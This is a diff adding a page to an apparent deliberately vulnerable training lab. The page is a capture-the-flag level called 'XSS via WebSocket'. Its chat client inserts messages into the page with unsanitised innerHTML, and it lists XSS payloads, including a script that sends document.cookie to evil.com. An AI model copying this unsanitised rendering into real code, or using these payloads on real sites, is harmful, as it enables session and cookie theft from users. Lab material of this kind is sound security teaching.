@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title><%= title %> - EliteHackLab</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"></head>
+<body>
+  <div class="matrix-bg"></div>
+  <nav class="main-nav"><div class="nav-brand"><span class="brand-icon">💀</span><span class="brand-text">Elite<span class="highlight">Hack</span>Lab</span></div><div class="nav-links"><a href="/"><i class="fas fa-home"></i> Dashboard</a></div></nav>
+  <div class="lab-container">
+    <div class="lab-header"><h1>🔌 XSS via WebSocket</h1><div class="lab-info"><span class="lab-tag difficulty-hard">Hard</span></div></div>
+    <div class="lab-section"><h2><i class="fas fa-crosshairs"></i> Objective</h2><p>Chat messages from WebSocket are rendered with innerHTML (no sanitization). Send an XSS payload through the chat to execute JS in other connected clients.</p></div>
+    <div class="lab-section">
+      <h2><i class="fas fa-terminal"></i> Chat Room</h2>
+      <div class="vulnerable-form">
+        <button onclick="connectChat()" class="btn">Join Chat</button>
+        <label style="margin-top:1rem;">Message (supports HTML 😈):</label>
+        <input type="text" id="chatMsg" value="<img src=x onerror=alert('XSS')>" autocomplete="off">
+        <button onclick="sendChat()" class="btn btn-danger" style="margin-top:0.5rem;">Send</button>
+      </div>
+      <div id="chatBox" class="result-box" style="margin-top:1rem;min-height:200px;max-height:300px;overflow-y:auto;"></div>
+      <div class="code-block">XSS payloads via WebSocket chat:
+&lt;img src=x onerror=alert(document.cookie)&gt;
+&lt;svg onload=alert('XSS via WS')&gt;
+&lt;script&gt;fetch('http://evil.com/steal?c='+document.cookie)&lt;/script&gt;</div>
+    </div>
+    <div class="flag-submit"><h3><i class="fas fa-flag"></i> Capture The Flag</h3>
+      <form onsubmit="submitFlagInline('websocket-attack','flagInput_ws2','flagResult_ws2'); return false;" style="display:flex; gap:0.5rem; max-width:500px; margin:0 auto;"><input type="text" id="flagInput_ws2" placeholder="FLAG{...}" autocomplete="off"><button type="submit" class="btn">Submit</button></form>
+      <div id="flagResult_ws2" style="display:none; margin-top:1rem;"></div>
+    </div>
+  </div>
+  <script src="/js/main.js"></script>
+  <script>
+    let chatWs;
+    function connectChat(){chatWs=new WebSocket(`ws://${location.host}/ws`);chatWs.onmessage=(e)=>{const d=JSON.parse(e.data);if(d.type==='chat')document.getElementById('chatBox').innerHTML+=`<p><b>${d.user}:</b> ${d.message}</p>`;};chatWs.onopen=()=>document.getElementById('chatBox').innerHTML+='<p style="color:var(--neon-green);">Connected to chat!</p>';}
+    function sendChat(){if(!chatWs)return;chatWs.send(JSON.stringify({type:'chat',user:'hacker',message:document.getElementById('chatMsg').value}));}
+  </script>
+</body>
+</html>
